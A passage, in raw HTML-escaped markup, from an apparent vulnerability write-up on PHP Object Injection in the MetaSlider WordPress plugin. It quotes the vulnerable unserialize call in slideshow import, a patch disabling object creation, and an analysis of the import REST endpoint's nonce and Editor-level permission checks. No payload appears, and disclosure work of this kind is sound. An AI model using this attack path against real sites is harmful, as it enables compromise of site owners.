class=&#34;nv&#34;&gt;$new_slideshow_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;maybe_unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;{#ID#}&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$new_slideshow_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Replace &lt;code&gt;maybe_unserialize()&lt;/code&gt; with a safer version using &lt;code&gt;unserialize(...,&amp;ensp;[&#39;allowed_classes&#39;&amp;ensp;=&amp;gt;&amp;ensp;false])&lt;/code&gt; to &lt;strong&gt;prevent object creation&lt;/strong&gt; during unserialization.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;maybe_unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_serialized&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Don&amp;#39;t&amp;ensp;attempt&amp;ensp;to&amp;ensp;unserialize&amp;ensp;data&amp;ensp;that&amp;ensp;wasn&amp;#39;t&amp;ensp;serialized&amp;ensp;going&amp;ensp;in.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trim&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;allowed_classes&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This eliminates the PHP Object Injection risk.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a POST API:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$namespace&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;metaslider/v1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;register_rest_route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;namespace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/slideshow/import&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;methods&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;callback&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;api&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;import_slideshows&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;permission_callback&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;api&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;can_access&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)));&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;with callback &lt;code&gt;import_slideshows&lt;/code&gt; and permission validated via &lt;code&gt;can_access()&lt;/code&gt;.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;const&lt;/span&gt;&amp;ensp;&lt;span class=&#34;no&#34;&gt;DEFAULT_CAPABILITY_EDIT_SLIDES&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;edit_others_posts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;can_access&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$capability&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;metaslider_capability&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;MetaSliderPlugin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;DEFAULT_CAPABILITY_EDIT_SLIDES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Check&amp;ensp;for&amp;ensp;the&amp;ensp;nonce&amp;ensp;on&amp;ensp;the&amp;ensp;server&amp;ensp;(used&amp;ensp;by&amp;ensp;WP&amp;ensp;REST)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;HTTP_X_WP_NONCE&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_verify_nonce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sanitize_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;HTTP_X_WP_NONCE&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp_rest&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;current_user_can&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$capability&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;This&amp;ensp;is&amp;ensp;for&amp;ensp;when&amp;ensp;not&amp;ensp;using&amp;ensp;Axios&amp;ensp;(example:&amp;ensp;callout.php)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;METASLIDER_NONCE&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_verify_nonce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sanitize_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;METASLIDER_NONCE&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;metaslider_request&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;current_user_can&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$capability&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function only allows users with &lt;code&gt;edit_others_posts&lt;/code&gt; capability (Editor or higher) to call the API.&lt;/p&gt;&#xA;&lt;p&gt;It validates in two ways:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;If the &lt;code&gt;X-WP-Nonce&lt;/code&gt; header exists, the plugin verifies the &lt;code&gt;&#39;wp_rest&#39;&lt;/code&gt; nonce and checks the capability.&lt;/li&gt;&#xA;&lt;li&gt;If the &lt;code&gt;METASLIDER_NONCE&lt;/code&gt; parameter exists, the plugin verifies the &lt;code&gt;&#39;metaslider_request&#39;&lt;/code&gt; nonce and checks the capability.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;If neither is valid, API access is denied.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;import_slideshows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;can_access&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;deny_access&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_request_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;slideshows&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;slideshows&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_send_json_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Nothing&amp;ensp;to&amp;ensp;import.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span 